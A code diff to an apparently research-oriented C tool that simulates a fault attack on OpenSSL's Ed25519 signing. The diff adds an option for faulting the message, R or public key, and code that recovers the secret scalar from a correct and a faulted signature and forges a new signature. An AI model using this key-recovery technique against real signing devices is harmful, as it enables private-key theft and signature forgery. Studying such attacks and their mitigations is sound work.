@@ -2,6 +2,7 @@
 #include <stdint.h>
 #include <argp.h>
 #include <gmp.h>
+#include <string.h>
 
 #include "openssl/conf.h"
 #include "openssl/evp.h"
@@ -15,17 +16,22 @@
 
 #define SIGN_RUNS 2
 
+#define ARGFLAG_FAULT		'F'
 #define ARGFLAG_MIT_RAND 	0x80
 #define ARGFLAG_VERBOSE		'v'
 #define ARGFLAG_NO_COLOR	'p'
 
 // Globals
+int fault_param = FLAGS_FAULT_PARAM_M;
 int mit_rand = 0;
 
 // Configure argp
-const char *argp_program_version = "ossl-ed25519-attack 1.0";
+const char *argp_program_version = "ossl-ed25519-attack 1.0.2";
 static char doc[] = "A simulated fault attack on OpenSSL Ed25519";
 static struct argp_option options[] = {
+	{0,0,0,0, "Faults:"},
+	{"fault", ARGFLAG_FAULT, "FAULT", OPTION_ARG_OPTIONAL, "Choose what parameter to fault:\n\"M\", \"R\", \"A\", \"none\" (default is M)" },
+
 	{0,0,0,0, "Mitigations:"},
 	{"mit-rand", ARGFLAG_MIT_RAND, 0, 0, "Add randomness to nonce"},
 
@@ -44,7 +50,7 @@ uint8_t sig[SIGN_RUNS][64];
 
 // Function declarations
 int sha512(mpz_t h, const mpz_t R, const mpz_t A, const uint8_t *m, const int m_len);
-int recover_a(mpz_t a, const mpz_t A, const mpz_t R, const mpz_t s1, const mpz_t s2);
+int recover_a(mpz_t a, const mpz_t A, const mpz_t fA, const mpz_t R, const mpz_t fR, const mpz_t s, const mpz_t fs);
 int verify_ossl(const uint8_t sig[64], const uint8_t public_key[32], const uint8_t *m, const int m_len);
 
 // Ed25519 function imports from openssl/crypto/ec/curve25519.c (patched)
@@ -65,37 +71,58 @@ static int parse_opt (int key, char *arg, struct argp_state *state)
 	{
 	case ARGFLAG_MIT_RAND:
 		mit_rand = 1;
+		break;
 	case ARGFLAG_VERBOSE:
 		pp_verbose = 1;
 		break;
 	case ARGFLAG_NO_COLOR:
 		pp_color = 0;
+		break;
+	case ARGFLAG_FAULT:
+		if (arg == NULL)
+			return ARGP_ERR_UNKNOWN;
+		else if (strcmp(arg, "none") == 0)
+			fault_param = FLAGS_FAULT_PARAM_NONE;
+		else if (strcmp(arg, "R") == 0)
+			fault_param = FLAGS_FAULT_PARAM_R;
+		else if (strcmp(arg, "A") == 0)
+			fault_param = FLAGS_FAULT_PARAM_A;
+		else if (strcmp(arg, "M") == 0)
+			fault_param = FLAGS_FAULT_PARAM_M;
+		else
+			return ARGP_ERR_UNKNOWN;
+		break;
 	
 	default:
-		break;
+		return ARGP_ERR_UNKNOWN;
 	}
 
 	return 0;
 }
 
 
-int recover_a(mpz_t a, const mpz_t A, const mpz_t R, const mpz_t s1, const mpz_t s2)
+int recover_a(mpz_t a, const mpz_t A, const mpz_t fA, const mpz_t R, const mpz_t fR, const mpz_t s, const mpz_t fs)
 {
 	// Configure pretty print
 	pretty_print_cfg("[ATCK] {ossl_ed25519_attack.c:recover_a()}");
 	pretty_print_text("Recover secret a:");
 
 	pretty_print_v_mpz("R  =", R);
+	if (mpz_cmp(R, fR) != 0)
+		pretty_print_v_mpz("fR =", fR);
 	pretty_print_v_mpz("A  =", A);
-	pretty_print_v_mpz("s1 =", s1);
-	pretty_print_v_mpz("s2 =", s2);
+	if (mpz_cmp(A, fA) != 0)
+		pretty_print_v_mpz("fA =", fA);
+	pretty_print_v_mpz("s  =", s);
+	if (mpz_cmp(s, fs) != 0)
+		pretty_print_v_mpz("fs =", fs);
 
-	mpz_t h1, h2, h, s, nr, nR, tmp, l;
-	mpz_inits(h1, h2, h, s, nr, nR, tmp, l, NULL);
+	mpz_t h, fh, nr, nR, tmp, l;
+	mpz_inits(h, fh, nr, nR, tmp, l, NULL);
 
-	// Compute hashes h1, h2
-	if (!sha512(h1, R, A, kmsg_original, sizeof(kmsg_original))
-		|| !sha512(h2, R, A, kmsg, sizeof(kmsg))) {
+	// Compute hashes h, fh
+	if (!sha512(h, R, A, kmsg_original, sizeof(kmsg_original))
+		|| !sha512(fh, fR, fA, kmsg, sizeof(kmsg))) {
 		pretty_print_text_col("Error computing hashes!", PP_COL_RED);
 		goto err;
 	}
@@ -105,24 +132,24 @@ int recover_a(mpz_t a, const mpz_t A, const mpz_t R, const mpz_t s1, const mpz_t
 	mpz_ui_pow_ui(l, 2, 252);
 	mpz_add(l, l, tmp);
 	
-	mpz_mod(h1, h1, l);
-	mpz_mod(h2, h2, l);
+	mpz_mod(h, h, l);
+	mpz_mod(fh, fh, l);
 
 	pretty_print_v_mpz("l          =", l);
-	pretty_print_v_mpz("h1 (mod l) =", h1);
-	pretty_print_v_mpz("h2 (mod l) =", h2);
+	pretty_print_v_mpz("h (mod l)  =", h);
+	pretty_print_v_mpz("fh (mod l) =", fh);
 
-	// recover secret a = (s1 - s2) / (h1 - h2)
-	//                  = (s1 - s2) * (h1 - h2)^-1
-	mpz_sub(h, h1, h2);
+	// recover secret a = (s - fs) / (h - fh)
+	//                  = (s - fs) * (h - fh)^-1
+	mpz_sub(h, h, fh);
 	mpz_mod(h, h, l);
 	if (!mpz_invert(h, h, l)) {
-		pretty_print_text_col("There is no modular inverse of h = (h1 - h2)!", PP_COL_RED);
+		pretty_print_text_col("There is no modular inverse of h = (h - fh)!", PP_COL_RED);
 		goto err;
 	}
-	mpz_sub(s, s1, s2);
-	mpz_mod(s, s, l);
-	mpz_mul(a, s, h);
+	mpz_sub(tmp, s, fs);
+	mpz_mod(tmp, tmp, l);
+	mpz_mul(a, tmp, h);
 	mpz_mod(a, a, l);
 
 	pretty_print_v_mpz("a =", a);
@@ -147,25 +174,25 @@ int recover_a(mpz_t a, const mpz_t A, const mpz_t R, const mpz_t s1, const mpz_t
 	mpz_import(nR, sizeof(a_R), -1, sizeof(uint8_t), 0, 0, a_R);
 	pretty_print_v_mpz("New R =", nR);
 
-	// h1 = H(nR, A, test_msg)
-	if (!sha512(h1, nR, A, test_msg, sizeof(test_msg))) {
+	// h = H(nR, A, test_msg)
+	if (!sha512(h, nR, A, test_msg, sizeof(test_msg))) {
 		pretty_print_text_col("Error computing new hash!", PP_COL_RED);
 		goto err;
 	}
 
-	// s = (nr + h1*a) mod l
-	mpz_mul(h, h1, a);
+	// s = (nr + h*a) mod l
+	mpz_mul(h, h, a);
 	mpz_mod(h, h, l);
-	mpz_add(s, nr, h);
-	mpz_mod(s, s, l);
-	pretty_print_v_mpz("s =", s);
+	mpz_add(tmp, nr, h);
+	mpz_mod(tmp, tmp, l);
+	pretty_print_v_mpz("s =", tmp);
 
 	// Verify newly generated signature
 	int ret;
 	uint8_t sig[64];
 	uint8_t a_A[32];
 	mpz_export(sig, NULL, -1, sizeof(uint8_t), 0, 0, nR);
-	mpz_export(sig + 32, NULL, -1, sizeof(uint8_t), 0, 0, s);
+	mpz_export(sig + 32, NULL, -1, sizeof(uint8_t), 0, 0, tmp);
 	mpz_export(a_A, NULL, -1, sizeof(uint8_t), 0, 0, A);
 
 	ret = verify_ossl(sig, a_A, test_msg, sizeof(test_msg));
@@ -176,12 +203,12 @@ int recover_a(mpz_t a, const mpz_t A, const mpz_t R, const mpz_t s1, const mpz_t
 	else
 		goto err;
 
-	mpz_clears(h1, h2, h, s, nr, nR, tmp, l, NULL);
+	mpz_clears(h, fh, nr, nR, tmp, l, NULL);
 	pretty_print_cfg_rm();
 	return 1;
 
 err:
-	mpz_clears(h1, h2, h, s, nr, nR, tmp, l, NULL);
+	mpz_clears(h, fh, nr, nR, tmp, l, NULL);
 	ERR_print_errors_fp(stderr);
 	pretty_print_cfg_rm();
 	return 0;
@@ -277,6 +304,7 @@ int main(int arc, char *argv[])
 	ERR_load_crypto_strings();
 
 	EVP_PKEY *pkey = NULL;
+	EVP_PKEY *pkey_backup = NULL;
 	EVP_PKEY_CTX *pctx = NULL;
 	EVP_MD_CTX  *mdctx = NULL;
 	size_t sig_len = sizeof(sig[0]);
@@ -294,6 +322,9 @@ int main(int arc, char *argv[])
 	// Print public key
 	EVP_PKEY_get_raw_public_key(pkey, pub, &pub_len);
 	pretty_print("Raw public key:", pub, pub_len);
+
+	// Backup pkey
+	pkey_backup = EVP_PKEY_dup(pkey);
 
 	// Sign message
 	// Doc: https://www.openssl.org/docs/man1.1.1/man3/EVP_DigestSignInit.html
@@ -326,17 +357,20 @@ int main(int arc, char *argv[])
 	// Calculate secret a
 	if (ret == 0 && SIGN_RUNS >= 2) {
 
-		mpz_t A, R, s1, s2, a;
-		mpz_inits(A, R, s1, s2, a, NULL);
+		mpz_t A, R, fA, fR, s, fs, a;
+		mpz_inits(A, R, fA, fR, s, fs, a, NULL);
 		mpz_import(A, pub_len, -1, sizeof(pub[0]), 0, 0, pub);
+		EVP_PKEY_get_raw_public_key(pkey, pub, &pub_len);
+		mpz_import(fA, pub_len, -1, sizeof(pub[0]), 0, 0, pub);
 		mpz_import(R, sig_len / 2, -1, sizeof(sig[0][0]), 0, 0, sig[0]);
-		mpz_import(s1, sig_len / 2, -1, sizeof(sig[0][0]), 0, 0, sig[0] + 32);
-		mpz_import(s2, sig_len / 2, -1, sizeof(sig[0][0]), 0, 0, sig[1] + 32);
+		mpz_import(fR, sig_len / 2, -1, sizeof(sig[0][0]), 0, 0, sig[1]);
+		mpz_import(s, sig_len / 2, -1, sizeof(sig[0][0]), 0, 0, sig[0] + 32);
+		mpz_import(fs, sig_len / 2, -1, sizeof(sig[0][0]), 0, 0, sig[1] + 32);
 
-		recover_a(a, A, R, s1, s2);
+		recover_a(a, A, fA, R, fR, s, fs);
 		pretty_print_mpz("a =", a);
 
-		mpz_clears(a, A, R, s1, s2, NULL);
+		mpz_clears(A, R, fA, fR, s, fs, a, NULL);
 	}
 	
 	// Free stuff
